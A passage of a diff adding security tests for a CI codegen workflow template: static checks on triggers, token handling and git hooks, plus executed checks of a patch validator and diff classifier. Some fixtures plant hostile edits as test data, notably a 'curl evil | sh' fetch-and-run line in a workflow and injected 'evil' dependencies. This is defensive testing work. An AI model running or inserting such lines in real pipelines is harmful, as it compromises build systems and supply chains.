@@ -101,6 +101,12 @@
 #      tool or an unparseable answer is "could not evaluate", never current; a
 #      path or git dependency with an exact requirement is not looked up.
 #
+# 13. THE OPT-IN CODEGEN WORKFLOW (deps-cadence-codegen.template.yml, #519) is
+#      pinned in its own section at the end of this file (cg_static for the
+#      template, cg_exec for the blocks it extracts and runs, with its own
+#      mutations). The impl-side change it came with is pinned here too: every
+#      git call in open-pr passes `nohooks` (template-version 5).
+#
 # Vacuous-green guards: each step this gate executes or slices must be found
 # (a renamed step would otherwise check nothing), and every mutation must
 # change the template, or it proves nothing.
@@ -861,5 +867,716 @@ mutate "bun/npm heading reworded" impl 'echo "### Exact pins (bun and npm lanes)
 mutate "bun/npm sentence reworded" impl 'No bun or npm lane declares an exact pin.' 'No bun or npm lane declares an exact pin in this repo.'
 mutate "not-reported claim returns" impl '# do the same in a second section of their own (version 4).' '# exact pins are not reported in this version.'
 mutate "pub/cargo report after the mint" impl $'      - name: Report exact pins (pub and cargo lanes)\n' $'      - name: Mint GitHub App token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3.2.0\n        with:\n          client-id: ${{ secrets.PLATFORM_WRITER_APP_CLIENT_ID }}\n          private-key: ${{ secrets.PLATFORM_WRITER_APP_PRIVATE_KEY }}\n\n      - name: Report exact pins (pub and cargo lanes)\n'
+
+# ===================================================================================
+# 13. THE CODEGEN WORKFLOW (deps-cadence-codegen.template.yml, #519)
+# ===================================================================================
+# Opt-in third workflow: regenerates a repo's COMMITTED generated code on the
+# cadence PR when the refresh moved a generator. It keeps the #514/#517 split
+# (regen runs repo and package code with no secret; push runs none, validates
+# the untrusted patch BEFORE minting the token, and keeps the token out of
+# argv, hooks and global git config) and adds a REVIEW RULE, because the
+# allowed paths ARE app code and the cadence PR otherwise auto-merges unseen:
+#
+#   - auto-mergeable only if EVERY changed line is exactly empty, judged on a
+#     plain `--unified=0` diff. NEVER `-w` / `--ignore-blank-lines`: `-w`
+#     ignores whitespace inside a line, so a changed string literal (a GraphQL
+#     document, a URL) would pass as cosmetic. velovate's first version used it
+#     and a review caught it, so a case here builds that exact bypass and shows
+#     `git diff -w` calling it empty while the classifier calls it substantive.
+#   - anything else (spaces- or tab-only lines, CR/CRLF, reorders, mode
+#     changes, `\ No newline`, binary headers, an empty or malformed diff, an
+#     error, any value that is not an explicit "false") is SUBSTANTIVE:
+#     auto-merge is disabled and the PR dequeued BEFORE the push, nothing is
+#     pushed if the re-read PR state is still armed or queued, then one PR
+#     comment asks for a human review.
+#
+# Static rules (cg_static) read the template; executed rules (cg_exec) EXTRACT
+# each block between its `# BEGIN <name>` / `# END <name>` markers and run it,
+# so they test the code CI runs and not a copy of it:
+#   validate-codegen-patch  hostile patches, each asserted by its rejection
+#                           reason: workflow, lockfile and manifest edits, an
+#                           app-source edit outside the globs, create, delete,
+#                           rename, mode change, binary hunk, symlink, a
+#                           look-alike directory, an odd path, a non-cadence
+#                           branch, the loop breaker, an empty artifact; the
+#                           deny list holding when the globs are widened; and
+#                           a deep file matching `**/` (which an unquoted glob
+#                           expansion would break).
+#   glob-to-re              the one function the push job and render-cadence.sh
+#                           both run.
+#   classify-codegen-diff   the review rule above.
+#   push-codegen            against a stubbed `gh` and a local bare remote:
+#                           disarm-before-push, a failed disarm pushes nothing,
+#                           an unarmed non-substantive push leaves auto-merge.
+# Also pinned: every git call in the push job, and in the impl's open-pr job,
+# passes the hook-disabling `nohooks` (the impl's `git ls-files -s` was the one
+# that did not, found in review of #519), and the codegen workflow's toolchain
+# reader steps are byte-identical to the impl's (render-cadence.sh validates a
+# pin by running the impl's reader).
+CODEGEN="$TPL_DIR/deps-cadence-codegen.template.yml"
+CGW="$WORK/cg"; mkdir -p "$CGW"
+# The test repos must not inherit this machine's git config: a global
+# core.autocrlf would normalise the CR cases away before they are classified.
+export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null
+
+CG_BOT="sassydog-platform-writer[bot]"
+
+# all_run_bodies <file> — every `run: |` body, dedented.
+all_run_bodies() {
+    awk '
+        /^        run: \|$/ { body = 1; next }
+        body && /^[[:space:]]*$/ { print ""; next }
+        body && !/^          / { body = 0 }
+        body { sub(/^          /, ""); print }' "$1"
+}
+
+# bare_git <text> — `git <subcommand>` calls that do not pass `nohooks` or -c.
+# `git config` is exempt (it writes the identity and runs nothing). A quoted
+# word after "git" in an error message is prose, not a call.
+bare_git() {
+    grep -oE "(^|[^[:alnum:]_.\"'/-])git [a-z][a-z-]*" <<<"$1" | sed -E 's/^[^g]*//' | grep -vE '^git config$' || true
+}
+
+# if_block <file> <job> — the job's `if:` expression (a folded scalar).
+if_block() {
+    job_block "$1" "$2" | awk '
+        /^    if: / { f = 1; print; next }
+        f && /^      / { print; next }
+        f { exit }'
+}
+
+cg_static() { # <codegen template> <impl template>
+    local tpl="$1" impl="$2" rc=0 c jr jp frag mint_ln val_ln cls_ln n u blocks bodies
+    c="$(code "$tpl")"
+    jr="$(job_block "$tpl" regen | grep -vE '^[[:space:]]*#')"
+    jp="$(job_block "$tpl" push | grep -vE '^[[:space:]]*#')"
+    if [ -z "$jr" ] || [ -z "$jp" ]; then echo "could not slice the regen and push jobs (renamed?)"; return 1; fi
+
+    # Trigger: pull_request only, never pull_request_target, never a schedule.
+    grep -qE '^  pull_request:$' <<<"$c" || { echo "the codegen workflow is not triggered by pull_request"; rc=1; }
+    if grep -qE 'pull_request_target|workflow_run|^  schedule:|workflow_dispatch' <<<"$c"; then
+        echo "the codegen workflow has a trigger other than pull_request (pull_request_target runs with secrets on fork code)"; rc=1
+    fi
+
+    # The gate, repeated on EVERY job; the sender gate on the job holding the token.
+    local gate_r gate_p
+    gate_r="$(if_block "$tpl" regen)"; gate_p="$(if_block "$tpl" push)"
+    for frag in "github.event.pull_request.user.login == '$CG_BOT'" \
+                "startsWith(github.event.pull_request.head.ref, 'chore/deps-')" \
+                "github.event.pull_request.head.repo.full_name == github.repository"; do
+        grep -qF -- "$frag" <<<"$gate_r" || { echo "regen's gate lacks: $frag"; rc=1; }
+        grep -qF -- "$frag" <<<"$gate_p" || { echo "push's gate lacks: $frag"; rc=1; }
+    done
+    grep -qF -- "github.event.sender.login == '$CG_BOT'" <<<"$gate_p" \
+        || { echo "push's gate lacks the sender check (a human push would be committed under the App's name)"; rc=1; }
+    grep -qF -- "needs.regen.outputs.changed == 'true'" <<<"$gate_p" || { echo "push runs when regen found nothing"; rc=1; }
+
+    # regen: package code, so no secret and no App token, hosted, read-only.
+    if grep -qE 'secrets\.|create-github-app-token|app_token' <<<"$jr"; then
+        echo "the regen job references a secret or the App token; it runs the repo's generator and must hold neither"; rc=1
+    fi
+    grep -qE '^    runs-on: ubuntu-latest$' <<<"$jr" && grep -qE '^    runs-on: ubuntu-latest$' <<<"$jp" \
+        || { echo "regen and push must run on ubuntu-latest (ephemeral, GitHub-hosted)"; rc=1; }
+    if grep -qE 'self-hosted|\{\{RUNNER\}\}' <<<"$c"; then echo "the codegen workflow names a self-hosted runner"; rc=1; fi
+
+    # One credential, minted once, in push, after the patch is validated and classified.
+    if [ "$(grep -cE 'actions/create-github-app-token@' <<<"$c")" -ne 1 ] || ! grep -qE 'actions/create-github-app-token@' <<<"$jp"; then
+        echo "the App token must be minted exactly once, in push"; rc=1
+    fi
+    mint_ln="$(grep -n 'actions/create-github-app-token@' "$tpl" | head -1 | cut -d: -f1)"
+    val_ln="$(grep -n '^      - name: Validate and apply the codegen patch$' "$tpl" | head -1 | cut -d: -f1)"
+    cls_ln="$(grep -n '^      - name: Classify the regenerated diff$' "$tpl" | head -1 | cut -d: -f1)"
+    if [ -z "$mint_ln" ] || [ -z "$val_ln" ] || [ -z "$cls_ln" ] || [ "$mint_ln" -lt "$val_ln" ] || [ "$mint_ln" -lt "$cls_ln" ]; then
+        echo "the App token is minted before the patch is validated and classified (or a step was renamed)"; rc=1
+    fi
+    local mint
+    mint="$(step_block "$tpl" "Mint GitHub App token")"
+    grep -qE '^          permission-contents: write$' <<<"$mint" && grep -qE '^          permission-pull-requests: write$' <<<"$mint" \
+        || { echo "the mint does not request exactly contents and pull-requests write"; rc=1; }
+    grep -qE '^          repositories: ' <<<"$mint" || { echo "the mint is not scoped to this repository (repositories:)"; rc=1; }
+    if [ "$(grep -cE '^          permission-' <<<"$mint")" -ne 2 ]; then echo "the mint requests a permission beyond contents and pull-requests"; rc=1; fi
+    local used
+    used="$(grep -oE 'secrets\.[A-Za-z_][A-Za-z0-9_]*' <<<"$c" | sort -u)"
+    if grep -vqxE 'secrets\.PLATFORM_WRITER_APP_(CLIENT_ID|PRIVATE_KEY)' <<<"$used"; then
+        echo "the codegen workflow reads a secret other than the two App credentials: $(tr '\n' ' ' <<<"$used")"; rc=1
+    fi
+    if grep -qE 'GITHUB_TOKEN|github\.token' <<<"$c"; then echo "the codegen workflow reads the built-in token (no fallback credential)"; rc=1; fi
+    if grep -qE '^[[:space:]]*(contents|pull-requests|issues|actions|id-token|packages|checks|statuses|deployments|security-events|pages|discussions|attestations):[[:space:]]*write' <<<"$c"; then
+        echo "the built-in token is granted write"; rc=1
+    fi
+    while IFS= read -r frag; do
+        [ -n "$frag" ] || continue
+        [[ "$frag" =~ ^[[:space:]]*GH_TOKEN:[[:space:]]*\$\{\{[[:space:]]*steps\.app_token\.outputs\.token[[:space:]]*\}\}[[:space:]]*$ ]] \
+            || { echo "GH_TOKEN is not exactly the minted App token: $frag"; rc=1; }
+    done < <(grep -E '^[[:space:]]*GH_TOKEN:' <<<"$c")
+    if grep -qE 'continue-on-error' <<<"$c"; then echo "continue-on-error in the codegen workflow"; rc=1; fi
+
+    # push runs nothing but git, gh, awk and three actions.
+    while IFS= read -r u; do
+        [ -n "$u" ] || continue
+        case "$u" in
+            actions/checkout@*|actions/download-artifact@*|actions/create-github-app-token@*) ;;
+            *) echo "push uses '$u'; it may use only checkout, download-artifact and the token action"; rc=1 ;;
+        esac
+    done < <(sed -nE 's/^[[:space:]]*(- )?uses:[[:space:]]*([^[:space:]]+).*/\2/p' <<<"$jp")
+    if grep -qE '(^|[;&|({[:space:]])(bun|bunx|npm|npx|yarn|pnpm|node|flutter|dart|cargo|rustup|pod|make|python3?|pip3?|perl|ruby)([[:space:]]|$)' <<<"$jp"; then
+        echo "push runs a package manager or interpreter: $(grep -E '(^|[;&|({[:space:]])(bun|bunx|npm|npx|yarn|pnpm|node|flutter|dart|cargo|rustup|pod|make|python3?|pip3?|perl|ruby)([[:space:]]|$)' <<<"$jp" | head -1 | tr -s ' ')"; rc=1
+    fi
+    # Checkout never persists credentials into .git/config.
+    n="$(grep -cE 'actions/checkout@' <<<"$c")"
+    if [ "$n" -lt 2 ] || [ "$(grep -cE '^          persist-credentials: false$' <<<"$c")" -ne "$n" ]; then
+        echo "every checkout must set persist-credentials: false"; rc=1
+    fi
+    # Untrusted event values reach a shell only through env:, never by interpolation.
+    bodies="$(all_run_bodies "$tpl")"
+    if grep -qF '${{' <<<"$bodies"; then
+        echo "a run: body interpolates a \${{ }} expression (script injection); pass it through env:"; rc=1
+    fi
+    grep -qE '^  group: deps-cadence-codegen-\$\{\{ github\.event\.pull_request\.number \}\}$' <<<"$c" \
+        && grep -qE '^  cancel-in-progress: false$' <<<"$c" \
+        || { echo "one run per PR at a time (concurrency group by PR number, no cancel)"; rc=1; }
+
+    # The push-job blocks.
+    blocks="$CGW/static-blocks.sh"
+    : > "$blocks"
+    for n in validate-codegen-patch classify-codegen-diff push-codegen; do
+        if ! cg_blk "$tpl" "$n" "$CGW/s-$n.sh"; then echo "could not extract the $n block"; rc=1; continue; fi
+        grep -vE '^[[:space:]]*#' "$CGW/s-$n.sh" >> "$blocks"
+    done
+    local bg
+    bg="$(bare_git "$(cat "$blocks")")"
+    [ -z "$bg" ] || { echo "push-job git call(s) without nohooks (a hook inherits the step's environment): $(tr '\n' ';' <<<"$bg")"; rc=1; }
+    bg="$(bare_git "$(job_block "$impl" open-pr | grep -vE '^[[:space:]]*#')")"
+    [ -z "$bg" ] || { echo "the impl's open-pr job has git call(s) without nohooks: $(tr '\n' ';' <<<"$bg")"; rc=1; }
+
+    # Token handling in the push block: one-shot env-reading helper, never argv or a URL.
+    local pushblk classblk valblk
+    pushblk="$(grep -vE '^[[:space:]]*#' "$CGW/s-push-codegen.sh" 2>/dev/null)"
+    classblk="$(grep -vE '^[[:space:]]*#' "$CGW/s-classify-codegen-diff.sh" 2>/dev/null)"
+    valblk="$(grep -vE '^[[:space:]]*#' "$CGW/s-validate-codegen-patch.sh" 2>/dev/null)"
+    grep -qF -- "-c 'credential.helper=!f() { echo username=x-access-token; echo \"password=\$GH_TOKEN\"; }; f'" <<<"$pushblk" \
+        && grep -qF -- '-c credential.helper= \' <<<"$pushblk" \
+        || { echo "the push does not use the single-quoted env-reading credential helper (after clearing any other)"; rc=1; }
+    if grep -qE 'x-access-token:|@github\.com|GH_TOKEN[^"]*@' <<<"$pushblk"; then echo "the token is in a push URL or argv"; rc=1; fi
+    grep -qF 'export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null' <<<"$pushblk" \
+        && grep -qF 'export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null' <<<"$valblk" \
+        && grep -qF 'export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=/dev/null' <<<"$classblk" \
+        || { echo "a push-job block honours system or global git config"; rc=1; }
+    # Fail closed.
+    grep -qE '^substantive=true$' <<<"$pushblk" && grep -qF '[ "${SUBSTANTIVE:-}" = "false" ] && substantive=false' <<<"$pushblk" \
+        || { echo "the push does not default to substantive and accept only an explicit false"; rc=1; }
+    grep -qE '^substantive=true$' <<<"$classblk" || { echo "the classifier does not default to substantive"; rc=1; }
+    # The classifier: a plain --unified=0 diff, never -w.
+    if grep -qE '(^|[[:space:]])(-w|--ignore-[a-z-]+|-b|--word-diff[a-z=-]*|-I)([[:space:]]|$)' <<<"$classblk"; then
+        echo "the classifier ignores whitespace (-w / --ignore-*): that calls a changed string literal cosmetic"; rc=1
+    fi
+    for frag in '--unified=0' '--no-ext-diff' '--no-textconv' '--no-color' 'color.ui=false' 'core.quotePath=true'; do
+        grep -qF -- "$frag" <<<"$classblk" || { echo "the classifier does not force $frag"; rc=1; }
+    done
+    grep -qF 'raw="$(env -u GIT_EXTERNAL_DIFF -u GIT_DIFF_OPTS' <<<"$classblk" || { echo "the classifier does not unset GIT_EXTERNAL_DIFF / GIT_DIFF_OPTS"; rc=1; }
+    # Disarm BEFORE the push, decided by the re-read PR state; the loop breaker and the glob read.
+    local dis_ln push_ln
+    dis_ln="$(grep -n 'Could not disarm PR' <<<"$pushblk" | head -1 | cut -d: -f1)"
+    push_ln="$(grep -n 'push "\${GITHUB_SERVER_URL}' <<<"$pushblk" | head -1 | cut -d: -f1)"
+    if [ -z "$dis_ln" ] || [ -z "$push_ln" ] || [ "$dis_ln" -gt "$push_ln" ]; then echo "auto-merge is not disarmed (and verified) before the push"; rc=1; fi
+    grep -qF 'refusing to push again' <<<"$valblk" || { echo "no loop breaker in the validator"; rc=1; }
+    grep -qF 'read -r -a globs <<<"$CODEGEN_GLOBS"' <<<"$valblk" || { echo "the globs are not read with read -a (an unquoted expansion would glob against the checkout)"; rc=1; }
+    grep -qF "denied='^\\.git(hub)?/" <<<"$valblk" || { echo "the validator carries no deny list for workflows, manifests and lockfiles"; rc=1; }
+
+    # The toolchain reader steps are the impl's, byte for byte.
+    local name a b
+    for name in "Read the Flutter pin" "Read the Rust toolchain pin"; do
+        a="$(step_run "$impl" "$name")"; b="$(step_run "$tpl" "$name")"
+        if [ -z "$a" ] || [ -z "$b" ]; then echo "reader step '$name' missing from the impl or the codegen template"; rc=1
+        elif [ "$a" != "$b" ]; then echo "reader step '$name' differs from the impl's (the renderer validates a pin by running the impl's)"; rc=1; fi
+    done
+    return "$rc"
+}
+
+# ─── executed: fixtures ──────────────────────────────────────────────────────────────
+CG_GEN="apps/mobile/lib/graphql/__generated__"
+CG_REQ="$CG_GEN/weather_queries.req.gql.dart"
+CG_G="$CG_GEN/weather_queries.req.gql.g.dart"
+CG_MOCKS="apps/mobile/test/providers/chat_provider_test.mocks.dart"
+CG_TOP="apps/mobile/test/top_test.mocks.dart"
+CG_DEEP="apps/mobile/test/a/b/deep_test.mocks.dart"
+CG_GLOBS="$CG_GEN/*.gql.dart $CG_GEN/*.gql.g.dart apps/mobile/test/**/*_test.mocks.dart"
+
+# cg_blk <template> <name> <out> — the `# BEGIN <name>` … `# END <name>` block,
+# dedented out of its `run: |` body.
+cg_blk() {
+    awk -v b="# BEGIN $2" -v e="# END $2" 'index($0, b){f=1} f{print} index($0, e){exit}' "$1" | sed -E 's/^ {10}//' > "$3"
+    grep -q "END $2" "$3" && [ "$(wc -l < "$3")" -ge 3 ]
+}
+
+cg_make_repo() {
+    local r="$1"
+    mkdir -p "$r/$CG_GEN" "$r/apps/mobile/test/providers" "$r/apps/mobile/test/a/b" "$r/apps/mobile/lib" "$r/.github/workflows"
+    git -C "$r" init -q -b main
+    git -C "$r" config user.email test@example.com
+    git -C "$r" config user.name test
+    printf '// GENERATED\nimport "a.dart";\n' > "$r/$CG_REQ"
+    printf '// GENERATED\npart of x;\n' > "$r/$CG_G"
+    printf '// Mocks\nimport "b.dart";\n' > "$r/$CG_MOCKS"
+    printf '// Mocks\nimport "t.dart";\n' > "$r/$CG_TOP"
+    printf '// Mocks\nimport "d.dart";\n' > "$r/$CG_DEEP"
+    printf 'void main() {}\n' > "$r/apps/mobile/lib/main.dart"
+    printf 'name: app\n' > "$r/apps/mobile/pubspec.yaml"
+    printf 'packages: {}\n' > "$r/apps/mobile/pubspec.lock"
+    printf 'name: ci\n' > "$r/.github/workflows/ci.yml"
+    git -C "$r" add -A
+    git -C "$r" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
+}
+# cg_snap <repo> — the artifact patch, built the way regen builds it, then the
+# tree reset to HEAD as on push's fresh VM.
+cg_snap() {
+    local r="$1"
+    mkdir -p "$r.rt/codegen-in"
+    git -C "$r" add -A
+    git -C "$r" diff --cached --binary --no-renames --no-ext-diff --no-textconv > "$r.rt/codegen-in/codegen.patch"
+    git -C "$r" reset -q --hard HEAD
+    git -C "$r" clean -qfd
+}
+cg_blank() { printf '\n' >> "$1/$2"; }
+
+# cg_ctx <template> — extract the blocks and read the subject; sets VAL CLS PSH SUBJ.
+cg_ctx() {
+    VAL="$CGW/validate.sh"; CLS="$CGW/classify.sh"; PSH="$CGW/push.sh"; GLB="$CGW/glob.sh"
+    cg_blk "$1" validate-codegen-patch "$VAL" || { echo "could not extract validate-codegen-patch"; return 1; }
+    cg_blk "$1" classify-codegen-diff "$CLS" || { echo "could not extract classify-codegen-diff"; return 1; }
+    cg_blk "$1" push-codegen "$PSH" || { echo "could not extract push-codegen"; return 1; }
+    cg_blk "$1" glob-to-re "$GLB" || { echo "could not extract glob-to-re"; return 1; }
+    SUBJ="$(sed -n 's/^ *CODEGEN_SUBJECT: "\(.*\)"$/\1/p' "$1")"
+    [ -n "$SUBJ" ] || { echo "CODEGEN_SUBJECT not found"; return 1; }
+}
+
+cg_rc=0
+cg_fail() { echo "$1"; cg_rc=1; }
+
+# cgv <repo> <accept|reject> <label> [needle] [ref] [globs]
+cgv() {
+    local repo="$1" want="$2" label="$3" needle="${4:-}" ref="${5:-chore/deps-2026-11}" globs="${6-$CG_GLOBS}" got
+    ( cd "$repo" && RUNNER_TEMP="$repo.rt" HEAD_REF="$ref" CODEGEN_SUBJECT="$SUBJ" CODEGEN_GLOBS="$globs" \
+        bash "$VAL" >"$CGW/out" 2>&1 ); got=$?
+    if [ "$want" = accept ]; then
+        [ "$got" -eq 0 ] || cg_fail "$label: wanted accept, got exit $got: $(tail -n1 "$CGW/out")"
+        return
+    fi
+    if [ "$got" -eq 0 ]; then cg_fail "$label: ACCEPTED"; return; fi
+    if [ -n "$needle" ] && ! grep -qF -- "$needle" "$CGW/out"; then
+        cg_fail "$label: rejected for another reason (wanted '$needle'): $(tail -n1 "$CGW/out")"; return
+    fi
+    [ -z "$(git -C "$repo" status --porcelain)" ] || cg_fail "$label: rejected only AFTER changing the tree"
+}
+
+# cg_glob <pattern> <path> <y|n>
+cg_glob() {
+    local re
+    re="$(bash -c '. "$1"; glob_to_re "$2"' _ "$GLB" "$1")"
+    if [[ "$2" =~ $re ]]; then [ "$3" = y ] || cg_fail "glob '$1' matched '$2' (regex $re)"
+    else [ "$3" = n ] || cg_fail "glob '$1' did not match '$2' (regex $re)"; fi
+}
+
+# ─── executed: classification ───────────────────────────────────────────────────────
+cg_lock_repo() { # <dir> — merge base (tagged base), then the cadence commit moving a lockfile.
+    local r="$1"
+    cg_make_repo "$r"
+    printf 'packages:\n  code_builder:\n    version: "4.11.1"\n  http:\n    version: "1.0.0"\n' > "$r/apps/mobile/pubspec.lock"
+    git -C "$r" add -A && git -C "$r" commit -qm base && git -C "$r" tag base
+    printf 'packages:\n  code_builder:\n    version: "4.12.0"\n  http:\n    version: "1.1.0"\n' > "$r/apps/mobile/pubspec.lock"
+    git -C "$r" add -A && git -C "$r" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
+}
+CLS_OUT=""
+cg_classify() { # <repo> [env…] — sets CLS_OUT
+    local r="$1"; shift
+    : > "$r.out"; mkdir -p "$r.rt"; rm -f "$r.rt/codegen-review.md"
+    ( cd "$r" && env RUNNER_TEMP="$r.rt" GITHUB_OUTPUT="$r.out" BASE_SHA="$(git -C "$r" rev-parse base)" \
+        PR_NUMBER=2401 CODEGEN_SUBJECT="$SUBJ" "$@" bash "$CLS" >"$CGW/out" 2>&1 )
+    local rc=$?
+    CLS_OUT="$(sed -n 's/^substantive=//p' "$r.out")"
+    return $rc
+}
+cg_sub() { # <label> <repo> — must be substantive=true
+    cg_classify "$2" || cg_fail "$1: classify exited non-zero"
+    [ "$CLS_OUT" = true ] || cg_fail "$1: classified '$CLS_OUT', wanted substantive=true (this would stay auto-merge-armed)"
+}
+cg_seed_strings() { # <dir> — a generated file holding a GraphQL document and a URL in strings.
+    cg_lock_repo "$1"
+    printf 'const document = "query Weather { forecast(city: \\"x\\") { temp } }";\nconst url = "https://api.example.com/graphql";\nfinal a = 1;\nfinal b = 2;\n' > "$1/$CG_REQ"
+    git -C "$1" add -A && git -C "$1" commit -qm "seed strings"
+}
+
+# ─── executed: push ──────────────────────────────────────────────────────────────────
+# A recording `gh`: state in $GHS (queued / armed = true|false; fail_disable
+# exists → `pr merge --disable-auto` fails). The disarm records where the remote
+# branch stood at that moment.
+cg_stub() {
+    STUB="$CGW/stub-bin"; mkdir -p "$STUB"
+    cat > "$STUB/gh" <<'STUBEOF'
+#!/usr/bin/env bash
+echo "gh $*" >> "$GHS/log"
+case "$1 $2" in
+  "api users/"*) echo 4242 ;;
+  "api graphql")
+    if printf '%s' "$*" | grep -q dequeuePullRequest; then echo false > "$GHS/queued"; echo '{}'; exit 0; fi
+    echo "PR_kwDO $(cat "$GHS/queued") $(cat "$GHS/armed")" ;;
+  "pr merge")
+    [ -e "$GHS/fail_disable" ] && { echo "disable failed" >&2; exit 1; }
+    git -C "$REMOTE" rev-parse refs/heads/chore/deps-2026-11 > "$GHS/remote_at_disable"
+    echo false > "$GHS/armed" ;;
+  "pr comment")
+    while [ $# -gt 0 ]; do [ "$1" = "--body-file" ] && cp "$2" "$GHS/comment"; shift; done ;;
+esac
+STUBEOF
+    chmod +x "$STUB/gh"
+}
+# cg_push_repo <name> <queued> <armed> — bare remote with the cadence branch, a
+# clone at its head with a staged regen, fresh stub state.
+cg_push_repo() {
+    local name="$1"
+    PR_R="$CGW/$name"; GHS="$CGW/$name.gh"; REMOTE="$CGW/$name.srv/Example/repo.git"
+    rm -rf "$PR_R" "$GHS" "$CGW/$name.srv" "$CGW/$name.seed" "$PR_R.rt"
+    mkdir -p "$GHS" "$(dirname "$REMOTE")" "$PR_R.rt"
+    echo "$2" > "$GHS/queued"; echo "$3" > "$GHS/armed"
+    cg_make_repo "$CGW/$name.seed"
+    git clone -q --bare "$CGW/$name.seed" "$REMOTE"
+    git -C "$REMOTE" branch -q chore/deps-2026-11 main
+    git clone -q -b chore/deps-2026-11 "$REMOTE" "$PR_R"
+    git -C "$PR_R" config user.email test@example.com; git -C "$PR_R" config user.name test
+    OLD_HEAD="$(git -C "$PR_R" rev-parse HEAD)"
+    cg_blank "$PR_R" "$CG_REQ"; git -C "$PR_R" add -A
+}
+cg_run_push() { # <substantive value or UNSET>
+    local sub=(SUBSTANTIVE="$1"); [ "$1" = UNSET ] && sub=()
+    ( cd "$PR_R" && env -u SUBSTANTIVE PATH="$STUB:$PATH" GHS="$GHS" REMOTE="$REMOTE" RUNNER_TEMP="$PR_R.rt" \
+        HEAD_REF=chore/deps-2026-11 PR_NUMBER=2401 CODEGEN_SUBJECT="$SUBJ" GH_TOKEN=dummy APP_SLUG=sassydog-platform-writer \
+        GITHUB_SERVER_URL="file://$CGW/${PR_R##*/}.srv" GITHUB_REPOSITORY=Example/repo "${sub[@]}" \
+        bash "$PSH" >"$CGW/out" 2>&1 )
+}
+cg_remote_head() { git -C "$REMOTE" rev-parse refs/heads/chore/deps-2026-11; }
+cg_called() { grep -qF -- "$1" "$GHS/log" 2>/dev/null; }
+
+cg_exec() { # <codegen template> — 0 when every executed rule holds
+    cg_rc=0
+    cg_ctx "$1" || return 1
+    local R name
+
+    # ── validate-codegen-patch ──
+    R="$CGW/v-valid"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    cg_blank "$R" "$CG_REQ"; cg_blank "$R" "$CG_G"; cg_blank "$R" "$CG_MOCKS"; cg_blank "$R" "$CG_TOP"; cg_blank "$R" "$CG_DEEP"
+    cg_snap "$R"; cgv "$R" accept "a generated-only patch"
+    [ "$(git -C "$R" diff --cached --name-only | wc -l | tr -d ' ')" = 5 ] \
+        || cg_fail "the five generated files (including the nested and top-level mocks) were not all staged"
+
+    R="$CGW/v-workflow"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    cg_blank "$R" "$CG_REQ"; echo "  run: curl evil | sh" >> "$R/.github/workflows/ci.yml"; cg_snap "$R"
+    cgv "$R" reject "a workflow edit" ".github/workflows/ci.yml is a workflow, manifest or lockfile"
+    R="$CGW/v-lock"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    cg_blank "$R" "$CG_REQ"; echo "  evil: 1.0.0" >> "$R/apps/mobile/pubspec.lock"; cg_snap "$R"
+    cgv "$R" reject "a lockfile edit" "apps/mobile/pubspec.lock is a workflow, manifest or lockfile"
+    R="$CGW/v-manifest"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    echo "dependencies: {evil: any}" >> "$R/apps/mobile/pubspec.yaml"; cg_snap "$R"
+    cgv "$R" reject "a manifest edit" "apps/mobile/pubspec.yaml is a workflow, manifest or lockfile"
+    R="$CGW/v-appsrc"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    echo "// injected" >> "$R/apps/mobile/lib/main.dart"; cg_snap "$R"
+    cgv "$R" reject "an app-source edit outside the globs" "apps/mobile/lib/main.dart is outside the generated-file paths"
+    R="$CGW/v-create"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    printf '// new\n' > "$R/$CG_GEN/new_op.req.gql.dart"; cg_snap "$R"
+    cgv "$R" reject "a create" "it creates, deletes, renames, copies or re-modes a file"
+    R="$CGW/v-delete"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    rm "$R/$CG_G"; cg_snap "$R"
+    cgv "$R" reject "a delete" "it creates, deletes, renames, copies or re-modes a file"
+    R="$CGW/v-rename"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    git -C "$R" mv "$CG_REQ" "$CG_GEN/renamed.req.gql.dart"; mkdir -p "$R.rt/codegen-in"
+    git -C "$R" diff --cached --binary -M > "$R.rt/codegen-in/codegen.patch"; git -C "$R" reset -q --hard HEAD
+    cgv "$R" reject "a rename" "it creates, deletes, renames, copies or re-modes a file"
+    R="$CGW/v-mode"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    chmod +x "$R/$CG_REQ"; cg_snap "$R"
+    cgv "$R" reject "a mode change" "it creates, deletes, renames, copies or re-modes a file"
+    R="$CGW/v-binary"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    printf '\000\001\002binary' > "$R/$CG_REQ"; cg_snap "$R"
+    cgv "$R" reject "a binary hunk" "is a binary change"
+    R="$CGW/v-symlink"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    ln -s ../../../../.github/workflows/ci.yml "$R/$CG_GEN/link.req.gql.dart"
+    git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
+    rm "$R/$CG_GEN/link.req.gql.dart"; ln -s ../../../../apps/mobile/pubspec.lock "$R/$CG_GEN/link.req.gql.dart"; cg_snap "$R"
+    cgv "$R" reject "a symlink retarget" "mode '120000'"
+    R="$CGW/v-notgen"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    echo x > "$R/$CG_GEN/notes.md"; git -C "$R" add -A && git -C "$R" commit -qm "chore(deps): monthly lockfile refresh 2026-11"
+    echo y >> "$R/$CG_GEN/notes.md"; cg_snap "$R"
+    cgv "$R" reject "a non-generated file inside the generated directory" "notes.md is outside the generated-file paths"
+    R="$CGW/v-lookalike"; rm -rf "$R" "$R.rt"; cg_make_repo "$R"
+    mkdir -p "$R/apps/mobile/lib/graphql/__generated__x"; printf 'a\n' > "$R/apps/mobile/lib/graphql/__generated__x/foo.gql.dart"
